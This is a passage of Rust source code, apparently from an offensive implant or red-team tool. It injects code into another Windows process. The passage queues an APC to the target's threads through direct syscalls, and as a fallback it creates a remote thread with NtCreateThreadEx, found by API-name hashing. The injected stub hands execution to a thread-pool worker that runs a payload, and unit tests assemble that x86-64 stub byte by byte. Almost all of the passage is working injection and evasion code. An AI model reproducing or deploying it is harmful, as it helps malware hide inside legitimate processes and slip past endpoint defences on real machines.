            let te_tid = u32::from_le_bytes([te_buf[8], te_buf[9], te_buf[10], te_buf[11]]);

            if te_pid == pid && te_tid != 0 {
                // Try to open this thread with THREAD_SET_CONTEXT (needed for APC).
                // Also need THREAD_QUERY_INFORMATION to check if alertable, but
                // we'll just try the APC and see if it succeeds — simpler and
                // avoids additional syscalls.
                let mut h_thread: usize = 0;
                let mut cid = [0u64; 2];
                cid[0] = te_tid as u64;
                let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
                oa.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

                let thread_access = (THREAD_SET_CONTEXT | PROCESS_QUERY_INFORMATION) as u64;
                let open_ok = crate::syscall!(
                    "NtOpenThread",
                    &mut h_thread as *mut _ as u64,
                    thread_access,
                    &mut oa as *mut _ as u64,
                    cid.as_mut_ptr() as u64,
                );
                if let Ok(s) = open_ok {
                    if s >= 0 && h_thread != 0 {
                        // Queue the APC. NtQueueApcThread(hThread, stub_addr, NULL, NULL, NULL)
                        let apc_status = crate::syscall!(
                            "NtQueueApcThread",
                            h_thread as u64,
                            stub_addr as u64,
                            0u64,
                            0u64,
                            0u64,
                        );
                        crate::syscall!("NtClose", h_thread as u64).ok();
                        if let Ok(st) = apc_status {
                            if st >= 0 {
                                found = true;
                                break;
                            }
                        }
                    }
                }
            }

            // Advance to next thread.
            te_buf[4..].fill(0);
            let size_bytes = (TE_SIZE as u32).to_le_bytes();
            te_buf[0..4].copy_from_slice(&size_bytes);
            if t32n_fn(snap, te_buf.as_mut_ptr()) == 0 {
                break;
            }
        }
    }

    // Close snapshot handle.
    close_fn(snap);

    found
}

/// Fallback: execute the stub by creating a minimal thread.
///
/// This creates a transient thread whose only purpose is to run the short
/// TpAllocWork/TpPostWork stub. The stub itself is ~80 bytes and completes
/// in microseconds, after which the thread pool worker executes the actual
/// payload.
#[cfg(windows)]
unsafe fn execute_stub_via_thread(
    h_proc: *mut std::ffi::c_void,
    stub_addr: *mut std::ffi::c_void,
) -> Result<()> {
    use winapi::um::winnt::SYNCHRONIZE;

    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow!("ThreadPool: ntdll not found for NtCreateThreadEx"))?;
    let fn_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
    let fn_ptr = pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash)
        .ok_or_else(|| anyhow!("ThreadPool: NtCreateThreadEx not found"))?
        as *mut winapi::ctypes::c_void;

    type NtCreateThreadExFn = unsafe extern "system" fn(
        *mut *mut winapi::ctypes::c_void, // ThreadHandle
        u32,                              // DesiredAccess
        *mut winapi::ctypes::c_void,      // ObjectAttributes
        *mut winapi::ctypes::c_void,      // ProcessHandle
        *mut winapi::ctypes::c_void,      // StartRoutine
        *mut winapi::ctypes::c_void,      // Argument
        u32,                              // CreateFlags
        usize,                            // ZeroBits
        usize,                            // StackSize
        usize,                            // MaximumStackSize
        *mut winapi::ctypes::c_void,      // AttributeList
    ) -> i32;

    let nt_create: NtCreateThreadExFn = std::mem::transmute(fn_ptr);

    let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
    let status = nt_create(
        &mut h_thread,
        SYNCHRONIZE,
        std::ptr::null_mut(),
        h_proc,
        stub_addr,
        std::ptr::null_mut(),
        0,
        0,
        0,
        0,
        std::ptr::null_mut(),
    );
    if status < 0 {
        return Err(anyhow!(
            "ThreadPool: NtCreateThreadEx for stub failed: {:x}",
            status
        ));
    }
    if !h_thread.is_null() {
        crate::syscall!("NtClose", h_thread as u64).ok();
    }
    Ok(())
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Verify that the pe_resolve hash algorithm produces consistent results
    /// for the thread pool API names. This test validates that the hash
    /// values used for TpAllocWork, TpPostWork, and TpReleaseWork resolution
    /// are computed correctly and will match the actual ntdll export names.
    ///
    /// NOTE: These hashes cannot be verified against a live ntdll.dll on
    /// non-Windows hosts, but the hash computation itself is deterministic
    /// and cross-platform. The test ensures:
    /// 1. The hash function accepts the correct null-terminated strings
    /// 2. The hash values are non-zero (valid hash output)
    /// 3. All three function names produce distinct hashes
    #[test]
    fn test_tp_api_hash_resolution() {
        let hash_alloc = pe_resolve::hash_str(b"TpAllocWork\0");
        let hash_post = pe_resolve::hash_str(b"TpPostWork\0");
        let hash_release = pe_resolve::hash_str(b"TpReleaseWork\0");

        // All hashes must be non-zero.
        assert_ne!(hash_alloc, 0, "TpAllocWork hash must be non-zero");
        assert_ne!(hash_post, 0, "TpPostWork hash must be non-zero");
        assert_ne!(hash_release, 0, "TpReleaseWork hash must be non-zero");

        // All hashes must be distinct.
        assert_ne!(
            hash_alloc, hash_post,
            "TpAllocWork and TpPostWork hashes must differ"
        );
        assert_ne!(
            hash_alloc, hash_release,
            "TpAllocWork and TpReleaseWork hashes must differ"
        );
        assert_ne!(
            hash_post, hash_release,
            "TpPostWork and TpReleaseWork hashes must differ"
        );
    }

    /// Verify that the hash function is case-insensitive (DJB2 variant used
    /// by pe_resolve). TpAllocWork should hash the same as tpallocwork.
    #[test]
    fn test_tp_api_hash_case_insensitive() {
        let hash_mixed = pe_resolve::hash_str(b"TpAllocWork\0");
        let hash_lower = pe_resolve::hash_str(b"tpallocwork\0");
        let hash_upper = pe_resolve::hash_str(b"TPALLOCWORK\0");

        assert_eq!(
            hash_mixed, hash_lower,
            "hash should be case-insensitive (mixed vs lower)"
        );
        assert_eq!(
            hash_mixed, hash_upper,
            "hash should be case-insensitive (mixed vs upper)"
        );
    }

    /// Verify that the stub builder produces a non-empty stub with the
    /// correct epilogue (ret = 0xC3).
    #[test]
    fn test_stub_produces_valid_machine_code() {
        // We can't run the full injection on non-Windows, but we can verify
        // the stub layout by building it manually with known addresses.
        let remote_base: usize = 0x12345678;
        let tp_alloc_work: usize = 0xAABBCCDD;
        let tp_post_work: usize = 0x11223344;
        let tp_release_work: usize = 0x55667788;

        let mut stub: Vec<u8> = Vec::with_capacity(128);

        // sub rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);
        // lea rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x30]);
        // movabs rdx, <remote_base>
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        // xor r8d, r8d
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);
        // movabs rax, <tp_alloc_work>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_work as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);
        // mov rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
        // movabs rax, <tp_post_work>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_post_work as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);
        // mov rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
        // movabs rax, <tp_release_work>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_work as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);
        // add rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);
        // ret
        stub.push(0xC3);

        // Stub should be non-trivial.
        assert!(
            stub.len() > 40,
            "stub should be >40 bytes, got {}",
            stub.len()
        );

        // Last byte must be ret (0xC3).
        assert_eq!(*stub.last().unwrap(), 0xC3, "stub must end with ret (0xC3)");

        // Verify the remote_base is embedded at the expected offset.
        // After: sub rsp(4) + lea rcx(5) + movabs rdx prefix(2) = offset 11
        let rdx_offset = 4 + 5 + 2;
        let embedded_base =
            u64::from_le_bytes(stub[rdx_offset..rdx_offset + 8].try_into().unwrap());
        assert_eq!(
            embedded_base, remote_base as u64,
            "remote_base must be embedded in stub"
        );

        // Verify tp_alloc_work is embedded.
        // After rdx(8) + xor r8(3) + xor r9(3) + movabs rax prefix(2) = rdx_offset+8+3+3+2
        let rax1_offset = rdx_offset + 8 + 3 + 3 + 2;
        let embedded_alloc =
            u64::from_le_bytes(stub[rax1_offset..rax1_offset + 8].try_into().unwrap());
        assert_eq!(
            embedded_alloc, tp_alloc_work as u64,
            "TpAllocWork addr must be in stub"
        );
    }
}
